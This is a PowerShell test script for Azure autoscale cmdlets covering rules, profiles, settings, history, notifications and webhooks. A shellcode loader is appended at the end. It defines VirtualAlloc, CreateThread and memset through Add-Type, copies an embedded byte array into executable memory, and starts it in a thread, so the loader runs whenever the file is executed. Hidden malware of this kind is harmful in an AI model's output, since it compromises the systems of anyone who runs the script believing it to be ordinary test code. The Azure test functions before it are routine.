














function Test-AddAzureRmAutoscaleSetting
{
	
	$resourceId = "/subscriptions/b67f7fec-69fc-4974-9099-a26bd6ffeda3/resourceGroups/TestingMetricsScaleSet/providers/Microsoft.Compute/virtualMachineScaleSets/testingsc"
	$resourceGroup = "TestingMetricsScaleSet"

    
    

	$rule1 = New-AzAutoscaleRule -MetricName Requests -MetricResourceId $resourceId -Operator GreaterThan -MetricStatistic Average -Threshold 10 -TimeGrain 00:01:00 -ScaleActionCooldown 00:05:00 -ScaleActionDirection Increase -ScaleActionValue "1"
	$rule2 = New-AzAutoscaleRule -MetricName Requests -MetricResourceId $resourceId -Operator GreaterThan -MetricStatistic Average -Threshold 15 -TimeGrain 00:02:00 -ScaleActionCooldown 00:06:00 -ScaleActionDirection Decrease -ScaleActionValue "2"
	$profile1 = New-AzAutoscaleProfile -DefaultCapacity "1" -MaximumCapacity "10" -MinimumCapacity "1" -StartTimeWindow 2015-03-05T14:00:00 -EndTimeWindow 2015-03-05T14:30:00 -TimeWindowTimeZone GMT -Rule $rule1, $rule2 -Name "adios"
	$profile2 = New-AzAutoscaleProfile -DefaultCapacity "1" -MaximumCapacity "10" -MinimumCapacity "1" -Rule $rule1, $rule2 -Name "saludos" -RecurrenceFrequency Week -ScheduleDay "1" -ScheduleHour 5 -ScheduleMinute 15 -ScheduleTimeZone UTC

    try
    {
        
		Add-AzAutoscaleSetting -Location "East US" -Name MySetting -ResourceGroup $resourceGroup -TargetResourceId $resourceId -AutoscaleProfile $profile1, $profile2
    }
    finally
    {
        
        
    }
}


function Test-GetAzureRmAutoscaleSetting
{
    
    $rgname = 'TestingMetricsScaleSet'

    try
    {
	    $actual = Get-AzAutoscaleSetting -ResourceGroup $rgname -detailedOutput

        
		Assert-AreEqual $actual.Count 1
    }
    finally
    {
        
        
    }
}


function Test-GetAzureRmAutoscaleSettingByName
{
    
    $rgname = 'TestingMetricsScaleSet'

    try
    {
		$actual = Get-AzAutoscaleSetting -ResourceGroup $rgname -Name "MySetting" -detailedOutput

		
		Assert-NotNull $actual "Result is null"
    }
    finally
    {
        
        
    }
}


function Test-RemoveAzureRmAutoscaleSetting
{
    
    $rgname = 'Default-Web-EastUS'

    try
    {
		Remove-AzAutoscaleSetting -ResourceGroup $rgname -name DefaultServerFarm-Default-Web-EastUS
    }
    finally
    {
        
        
    }
}


function Test-GetAzureRmAutoscaleHistory
{
    try
    {
		$actual = Get-AzAutoscaleHistory -StartTime 2015-02-10T02:35:00Z -endTime 2015-02-10T02:40:00Z -detailedOutput

        
		Assert-AreEqual $actual.Count 2
    }
    finally
    {
        
        
    }
}



function Test-NewAzureRmAutoscaleNotification
{
    try
    {
		Assert-Throws { New-AzAutoscaleNotification } "At least one Webhook or one CustomeEmail must be present, or the notification must be sent to the admin or co-admin"

		$actual = New-AzAutoscaleNotification -CustomEmail gu@ms.com, hu@net.net

        
		Assert-Null $actual.Webhooks "webhooks"
		Assert-NotNull $actual.Email "email"
		Assert-NotNull $actual.Email.CustomEmails "custom emails"
		Assert-AreEqual 2 $actual.Email.CustomEmails.Length "length"
		Assert-False { $actual.Email.SendToSubscriptionAdministrator } "SendToSubscriptionAdministrator"
		Assert-False { $actual.Email.SendToSubscriptionCoAdministrators } "SendToSubscriptionCoAdministrators"

		$actual = New-AzAutoscaleNotification -SendEmailToSubscriptionAdministrator

        
		Assert-Null $actual.Webhooks
		Assert-NotNull $actual.Email
		Assert-Null $actual.Email.CustomeEmails
		Assert-True { $actual.Email.SendToSubscriptionAdministrator } "SendToSubscriptionAdministrator"
		Assert-False { $actual.Email.SendToSubscriptionCoAdministrators } "SendToSubscriptionCoAdministrators"

		$actual = New-AzAutoscaleNotification -SendEmailToSubscriptionCoAdministrator

        
		Assert-Null $actual.Webhooks
		Assert-NotNull $actual.Email
		Assert-Null $actual.Email.CustomeEmails
		Assert-False { $actual.Email.SendToSubscriptionAdministrator } "SendToSubscriptionAdministrator"
		Assert-True { $actual.Email.SendToSubscriptionCoAdministrators } "SendToSubscriptionCoAdministrators"
    }
    finally
    {
        
        
    }
}


function Test-NewAzureRmAutoscaleWebhook
{
    try
    {
		$actual = New-AzAutoscaleWebhook -ServiceUri "http://myservice.com"

        
		Assert-AreEqual "http://myservice.com" $actual.ServiceUri
		Assert-AreEqual 0 $actual.Properties.Count
    }
    finally
    {
        
        
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x3e,0xeb,0xad,0x26,0xdb,0xd7,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x58,0x13,0x83,0xe8,0xfc,0x03,0x58,0x31,0x09,0x58,0xda,0xa5,0x4f,0xa3,0x23,0x35,0x30,0x2d,0xc6,0x04,0x70,0x49,0x82,0x36,0x40,0x19,0xc6,0xba,0x2b,0x4f,0xf3,0x49,0x59,0x58,0xf4,0xfa,0xd4,0xbe,0x3b,0xfb,0x45,0x82,0x5a,0x7f,0x94,0xd7,0xbc,0xbe,0x57,0x2a,0xbc,0x87,0x8a,0xc7,0xec,0x50,0xc0,0x7a,0x01,0xd5,0x9c,0x46,0xaa,0xa5,0x31,0xcf,0x4f,0x7d,0x33,0xfe,0xc1,0xf6,0x6a,0x20,0xe3,0xdb,0x06,0x69,0xfb,0x38,0x22,0x23,0x70,0x8a,0xd8,0xb2,0x50,0xc3,0x21,0x18,0x9d,0xec,0xd3,0x60,0xd9,0xca,0x0b,0x17,0x13,0x29,0xb1,0x20,0xe0,0x50,0x6d,0xa4,0xf3,0xf2,0xe6,0x1e,0xd8,0x03,0x2a,0xf8,0xab,0x0f,0x87,0x8e,0xf4,0x13,0x16,0x42,0x8f,0x2f,0x93,0x65,0x40,0xa6,0xe7,0x41,0x44,0xe3,0xbc,0xe8,0xdd,0x49,0x12,0x14,0x3d,0x32,0xcb,0xb0,0x35,0xde,0x18,0xc9,0x17,0xb6,0xed,0xe0,0xa7,0x46,0x7a,0x72,0xdb,0x74,0x25,0x28,0x73,0x34,0xae,0xf6,0x84,0x3b,0x85,0x4f,0x1a,0xc2,0x26,0xb0,0x32,0x00,0x72,0xe0,0x2c,0xa1,0xfb,0x6b,0xad,0x4e,0x2e,0x01,0xa8,0xd8,0x8f,0xeb,0xf3,0x1a,0x58,0x16,0xf4,0x0b,0xc4,0x9f,0x12,0x7b,0xa4,0xcf,0x8a,0x3b,0x14,0xb0,0x7a,0xd3,0x7e,0x3f,0xa4,0xc3,0x80,0x95,0xcd,0x69,0x6f,0x40,0xa5,0x05,0x16,0xc9,0x3d,0xb4,0xd7,0xc7,0x3b,0xf6,0x5c,0xe4,0xbc,0xb8,0x94,0x81,0xae,0x2c,0x55,0xdc,0x8d,0xfa,0x6a,0xca,0xb8,0x02,0xff,0xf1,0x6a,0x55,0x97,0xfb,0x4b,0x91,0x38,0x03,0xbe,0xaa,0xf1,0x91,0x01,0xc4,0xfd,0x75,0x82,0x14,0xa8,0x1f,0x82,0x7c,0x0c,0x44,0xd1,0x99,0x53,0x51,0x45,0x32,0xc6,0x5a,0x3c,0xe7,0x41,0x33,0xc2,0xde,0xa6,0x9c,0x3d,0x35,0x37,0xe0,0xeb,0x73,0x4d,0x08,0x28;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

